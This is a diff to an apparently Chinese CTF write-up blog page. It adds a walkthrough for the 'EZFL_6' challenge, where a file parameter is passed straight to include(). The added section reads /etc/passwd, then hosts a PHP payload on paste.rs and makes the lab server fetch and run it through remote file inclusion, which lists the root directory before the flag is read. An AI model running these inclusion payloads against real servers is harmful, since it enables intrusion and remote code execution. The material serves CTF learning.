@@ -443,7 +443,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 4 分钟
                 </time>
             </div>
         
@@ -460,7 +460,7 @@
 
 
 
-                <span class="article-time--wordcount">1242 字</span>
+                <span class="article-time--wordcount">1533 字</span>
             </div>
         
     </footer>
@@ -890,7 +890,79 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 ><br>
 获得flag</p>
 <h3 id="ezfl_6">EZFL_6
-</h3><h2 id="ezfu">EZFU
+</h3><p>访问首页 页面存在 file 参数，查看源码可以看到注释：<!-- include($file); --><br>
+说明后端大概率直接对 file 做了 include()，先用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=/etc/passwd  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780741082204_fl6_1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl6_1.png"
+	
+	
+><br>
+成功读到文件，确认存在文件包含漏洞<br>
+继续测试后发现，php:// 和 data:// 都被关键词过滤，常规的 php://filter 利用不了。但进一步发现 http:// 可以被包含，也就是说这里不只是 LFI，还存在 RFI（远程文件包含）。更关键的是：远程文件中的 PHP 短标签 <?= ... ?> 会被目标服务器解析执行。于是可以在外部托管一个简单 payload，例如</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?=implode(&#39;,&#39;,scandir(&#39;/&#39;));?&gt;  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://paste.rs/web"  target="_blank" rel="noopener"
+    >https://paste.rs/web</a> 这是一个支持公开纯文本和 Raw 直链的粘贴网站<br>
+在上面直接输入 <?=implode(",",scandir("/"));?>  会获得一个链接  <a class="link" href="https://paste.rs/"  target="_blank" rel="noopener"
+    >https://paste.rs/</a>**** 每次都不一样  直接访问即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://docker.qingcen.net:38006/?file=https://paste.rs/SAfmv  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780741089953_fl6_2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl6_2.png"
+	
+	
+><br>
+再让目标去包含这个远程文件，从而枚举根目录。结果在根目录下发现了可疑文件  qingcenctf.txt  <br>
+直接读取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://docker.qingcen.net:38006/?file=/qingcenctf.txt  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780741084733_fl6_3.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl6_3.png"
+	
+	
+></p>
+<h2 id="ezfu">EZFU
 </h2><h3 id="ezfu-1">EZFU
 </h3><h3 id="ezfu_1">EZFU_1
 </h3><h3 id="ezfu_2">EZFU_2
